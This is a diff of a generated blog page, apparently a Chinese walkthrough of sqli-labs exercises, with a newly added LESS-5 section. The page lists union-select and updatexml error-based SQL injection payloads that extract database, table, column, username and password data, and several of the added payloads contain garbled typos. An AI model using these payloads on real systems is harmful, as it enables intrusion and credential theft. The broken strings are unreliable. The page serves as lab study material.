@@ -46,7 +46,7 @@
 <meta property="og:image" content="http://example.com/img/less5.png">
 <meta property="og:image" content="http://example.com/img/less11.png">
 <meta property="article:published_time" content="2025-10-13T08:42:43.000Z">
-<meta property="article:modified_time" content="2025-10-17T09:55:05.427Z">
+<meta property="article:modified_time" content="2025-10-17T16:24:29.848Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/img/less1.png">
@@ -336,7 +336,7 @@
       <div class="article-date">
   <span class="article-date-link icon-calendar" data-aos="zoom-in">
     <time datetime="2025-10-13T08:42:43.000Z" itemprop="datePublished">2025-10-13</time>
-    <time style="display: none;" id="post-update-time">2025-10-17</time>
+    <time style="display: none;" id="post-update-time">2025-10-18</time>
   </span>
   
 </div>
@@ -364,6 +364,13 @@
 <li>查字段，?id&#x3D;-1’ union select 1,2,group_concat(concat_ws(‘~’,username,password) )from security.users;–+</li>
 </ul>
 <h1 id="LESS-5"><a href="#LESS-5" class="headerlink" title="LESS-5"></a>LESS-5</h1><p><img src="/./img/less5.png" alt="图片"></p>
+<ul>
+<li>判断是否存在注入：?id&#x3D;1’and 1&#x3D;1–+</li>
+<li>判断库名:?id&#x3D;1 ‘and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)–+</li>
+<li>判断表名:?id&#x3D;1’and updatexml(1,concat(0x7e,(select table_ name from<br>information schema.tables where table schema&#x3D;’security’),0x7e),1)–+</li>
+<li>判断列名:?id&#x3D;1’and updatexml(1,concat(0x7e.(select column_name from<br>information schema.columns where table schema&#x3D;’secunty and table name&#x3D;’emails’ ),0x7e),1)–+</li>
+<li>判断数据:?id&#x3D;1 ‘and updatexml(1.concat(Ox7e,(select id from emails limit 0.1),0x7e),1)–+</li>
+</ul>
 <h1 id="LESS-11-（post型）"><a href="#LESS-11-（post型）" class="headerlink" title="LESS-11 （post型）"></a>LESS-11 （post型）</h1><p><img src="/./img/less11.png" alt="图片"></p>
 <ul>
 <li>bp拦截得到uname&#x3D;admin&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit可以成功登录</li>
@@ -469,10 +476,10 @@
     
       <div>
         <span class="icon-brush"></span>
-        3.5k
+        3.6k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        00:19
+        00:20
       </div>
     
     
@@ -667,7 +674,7 @@
           description: "",
           stripContent: "LESS-1  发送get请求，?id&amp;#x3D;1,正常输出用户名和密码 ?id&amp;#x3D;1’报错 ?id&amp;#x3D;-1’ or 1&amp;#x3D;1–+正常输出，存在注入点(–+为了清理原始语句中不需要的部分，让注入的代码能够顺利运行) 判断列数，?id&amp;#x3D;1’ order by 1,2,3,4;–+ 到4时报错，有3列 查回显，?id&amp;#x3D;-1’ union select 1,2,3;–+ 发现2和3的位置可以显示 查库名，?id&amp;#x3D;-1’ union select ",
           date: "Mon Oct 13 2025 16:42:43 GMT+0800",
-          updated: "Fri Oct 17 2025 17:55:05 GMT+0800",
+          updated: "Sat Oct 18 2025 00:24:29 GMT+0800",
           cover: "/images/banner.webp",
         };
       </script>
